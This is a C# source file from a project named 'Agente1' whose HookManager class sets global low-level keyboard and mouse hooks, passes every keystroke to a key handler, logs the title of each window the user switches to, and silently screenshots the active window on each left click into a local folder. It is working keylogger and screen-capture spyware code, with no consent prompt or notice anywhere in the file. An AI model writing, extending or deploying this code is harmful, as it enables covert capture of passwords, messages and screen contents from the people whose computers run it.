using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Agente1
{
    public class HookManager
    {
        public delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONDOWN = 0x0201;

        private readonly LowLevelProc _keyboardProc;
        private readonly LowLevelProc _mouseProc;
        private IntPtr _keyboardHookID = IntPtr.Zero;
        private IntPtr _mouseHookID = IntPtr.Zero;
        private readonly KeyHandler keyHandler;
        public readonly FileLogger fileLogger;
        private readonly bool captureScreen;
        private IntPtr lastForegroundWindow = IntPtr.Zero;

        public HookManager(KeyHandler keyHandler, FileLogger fileLogger, bool captureScreen)
        {
            this.keyHandler = keyHandler;
            this.fileLogger = fileLogger;
            this.captureScreen = captureScreen;
            _keyboardProc = KeyboardHookCallback;
            _mouseProc = MouseHookCallback;
        }

        public void SetHook()
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, GetModuleHandle(curModule.ModuleName), 0);
                _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public void Unhook()
        {
            UnhookWindowsHookEx(_keyboardHookID);
            UnhookWindowsHookEx(_mouseHookID);
        }

        public void Start()
        {
            SetHook();
            Task.Run(() => MonitorActiveWindow());
        }

        private async Task MonitorActiveWindow()
        {
            while (true)
            {
                IntPtr foregroundWindow = GetForegroundWindow();
                if (foregroundWindow != lastForegroundWindow)
                {
                    lastForegroundWindow = foregroundWindow;
                    string windowTitle = GetActiveWindowTitle(foregroundWindow);
                    if (!string.IsNullOrEmpty(windowTitle))
                    {
                        fileLogger.LogWindowTitle(windowTitle);
                    }
                }
                await Task.Delay(1000);
            }
        }

        private string GetActiveWindowTitle(IntPtr hWnd)
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            if (GetWindowText(hWnd, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    keyHandler.HandleKeyDown(key);
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    keyHandler.HandleKeyUp(key);
                }
            }
            return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
        }

        private IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_LBUTTONDOWN)
            {
                if (captureScreen)
                {
                    CaptureActiveWindow();
                }
            }
            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
        }

        private void CaptureActiveWindow()
        {
            IntPtr hWnd = GetForegroundWindow();
            if (hWnd == IntPtr.Zero)
                return;

            GetWindowRect(hWnd, out RECT rect);
            Rectangle bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);

            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                }
                string directory = "screen_capture";
                if (!Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }
                string fileName = Path.Combine(directory, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                bitmap.Save(fileName);
                fileLogger.LogScreenCapture(fileName);
            }
        }
    }
}
